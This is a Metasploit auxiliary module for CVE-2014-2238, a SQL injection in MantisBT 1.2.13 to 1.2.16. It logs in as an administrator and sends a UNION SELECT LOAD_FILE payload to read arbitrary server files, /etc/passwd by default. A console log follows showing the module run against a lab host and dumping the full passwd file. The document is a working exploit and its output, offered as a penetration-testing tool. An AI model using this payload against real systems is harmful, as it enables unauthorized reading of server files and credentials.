##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MantisBT Admin SQL Injection Arbitrary File Read",
      'Description'    => %q{
      Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if
      an attacker can gain access to administrative credentials.

      This vuln was fixed in 1.2.17.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Jakub Galczyk', #initial discovery
          'Brandon Perry <bperry.volatile@gmail.com>', #meatpistol module
        ],
      'References'     =>
        [
          ['CVE', '2014-2238'],
          ['URL', 'http://www.mantisbt.org/bugs/view.php?id=17055']
        ],
      'Platform'       => ['win', 'linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 28 2014"))

      register_options(
      [
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),
        OptString.new('USERNAME', [ true, 'Single username', 'administrator']),
        OptString.new('PASSWORD', [ true, 'Single password', 'password']),
        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])
      ], self.class)

  end

  def run
    post = {
      'return' => 'index.php',
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'secure_session' => 'on'
    }

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/login.php'),
      'method' => 'POST',
      'vars_post' => post
    })

    cookie = resp.get_cookies

    filepath = datastore['FILEPATH'].unpack("H*")[0]

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/adm_config_report.php'),
      'method' => 'POST',
      'data' => "save=1&filter_user_id=0&filter_project_id=0&filter_config_id=-7856%27+UNION+ALL+SELECT+11%2C11%2C11%2C11%2CCONCAT%280x71676a7571%2CIFNULL%28CAST%28HEX%28LOAD_FILE%280x#{filepath}%29%29+AS+CHAR%29%2C0x20%29%2C0x7169727071%29%2C11%23&apply_filter_button=Apply+Filter",
      'cookie' => cookie,
    })

    resp.body =~ /qgjuq(.*)qirpq/

    file = [$1].pack("H*")

    path = store_loot("mantisbt.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])
    print_good("File saved to: #{path}")
  end
end

__END__
bperry@ubuntu:~/tools/metasploit-framework$ ./msfconsole
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             http://metasploit.pro


       =[ metasploit v4.8.0-dev [core:4.8 api:1.0]
+ -- --=[ 1178 exploits - 649 auxiliary - 186 post
+ -- --=[ 312 payloads - 30 encoders - 8 nops

msf > use auxiliary/gather/mantisbt_admin_sqli 
msf auxiliary(mantisbt_admin_sqli) > set RHOST 172.31.16.109
RHOST => 172.31.16.109
msf auxiliary(mantisbt_admin_sqli) > set TARGETURI /mantisbt-1.2.16/
TARGETURI => /mantisbt-1.2.16/
msf auxiliary(mantisbt_admin_sqli) > set PASSWORD password
PASSWORD => password
msf auxiliary(mantisbt_admin_sqli) > show options

Module options (auxiliary/gather/mantisbt_admin_sqli):

   Name       Current Setting    Required  Description
   ----       ---------------    --------  -----------
   FILE       /etc/passwd        yes       Path to remote file
   PASSWORD   password           yes       Single password
   Proxies                       no        Use a proxy chain
   RHOST      172.31.16.109      yes       The target address
   RPORT      80                 yes       The target port
   TARGETURI  /mantisbt-1.2.16/  yes       Relative URI of MantisBT installation
   USERNAME   administrator      yes       Single username
   VHOST                         no        HTTP server virtual host

msf auxiliary(mantisbt_admin_sqli) > run

[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
bperry:x:1000:1000:Brandon Perry,,,:/home/bperry:/bin/bash
avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
usbmux:x:104:46:usbmux daemon,,,:/home/usbmux:/bin/false
dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/bin/false
whoopsie:x:106:114::/nonexistent:/bin/false
avahi:x:107:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:108:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:121:RealtimeKit,,,:/proc:/bin/false
saned:x:112:122::/home/saned:/bin/false
speech-dispatcher:x:113:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
lightdm:x:114:123:Light Display Manager:/var/lib/lightdm:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
mysql:x:116:125:MySQL Server,,,:/nonexistent:/bin/false

[*] Auxiliary module execution completed
msf auxiliary(mantisbt_admin_sqli) > 

